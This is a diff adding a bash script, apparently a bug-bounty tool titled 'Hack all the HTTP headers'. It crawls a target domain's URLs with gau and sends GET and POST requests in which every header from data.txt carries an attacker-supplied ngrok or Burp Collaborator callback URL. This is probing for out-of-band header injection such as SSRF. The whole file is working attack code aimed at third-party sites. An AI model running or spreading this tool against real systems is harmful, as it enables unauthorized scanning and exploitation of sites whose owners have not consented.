@@ -1,0 +1,56 @@
+clear
+cyan='\e[1;36m%s\e[0m\n'
+green='\e[1;32m%s\e[0m\n'
+printf "$cyan"
+./.banner
+arg=$1
+printf "$green" "Hack all the HTTP headers"
+echo ""
+if  [ $arg = "all" ]&> /dev/null ;
+  then
+   
+   printf "$green" "Warning it take more time its depend upon your subdomains list"
+   echo " "
+      read -p "Enter the full path with file name: " fl
+      read -p "Enter comany name: " comp
+      read -p "Enter ngrok or burp colab url: " ul
+      mkdir ~/recon/$comp/ &> /dev/null
+      mkdir ~/recon/$comp/h0st1l3Hunt3r &> /dev/null
+      mkdir ~/recon/$comp/h0st1l3Hunt3r/out &> /dev/null
+      while read domain ;
+         do
+            echo $domain | gau | tee -a ~/recon/$comp/h0st1l3Hunt3r/carwl.txt
+            while read url ;
+                do
+                 while read data ;
+                    do
+                      da=$(echo $url | cut -d"/" -f3)
+                      curl -I -X GET $url -H "$data $ul" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                      echo "^^^^^^^^^^^^^^^^^^^^^^ $url ^^^^^^^^^^^^^^^^^^^^^^" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                      curl -I -X POST $url -H "$data $ul" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                      echo "^^^^^^^^^^^^^^^^^^^^^^post $url ^^^^^^^^^^^^^^^^^^^^^^" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                 done < data.txt 
+            done < ~/recon/$comp/h0st1l3Hunt3r/carwl.txt
+      done < $fl
+else
+     printf "$green" "its just scan only for single domain or subdomain"
+     echo " "
+      read -p "Enter Domain name: " dl
+      read -p "Enter comany name: " comp
+      read -p "Enter ngrok or burp colab url: " url
+      mkdir ~/recon/$comp/ &> /dev/null
+      mkdir ~/recon/$comp/h0st1l3Hunt3r &> /dev/null
+      mkdir ~/recon/$comp/h0st1l3Hunt3r/out &> /dev/null
+      echo $dl | gau | tee -a ~/recon/$comp/h0st1l3Hunt3r/carwl.txt
+            while read urli ;
+                do
+                 while read data ;
+                    do
+                      da=$(echo $urli | cut -d"/" -f3)
+                      curl -I -X GET $urli -H "$data $url" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                      echo "^^^^^^^^^^^^^^^^^^^^^^ $urli ^^^^^^^^^^^^^^^^^^^^^^" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                      curl -I -X POST $urli -H "$data $url" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                      echo "^^^^^^^^^^^^^^^^^^^^^^post $urli ^^^^^^^^^^^^^^^^^^^^^^" | tee -a ~/recon/$comp/h0st1l3Hunt3r/out/$da.txt
+                 done < data.txt 
+            done < ~/recon/$comp/h0st1l3Hunt3r/carwl.txt
+fi
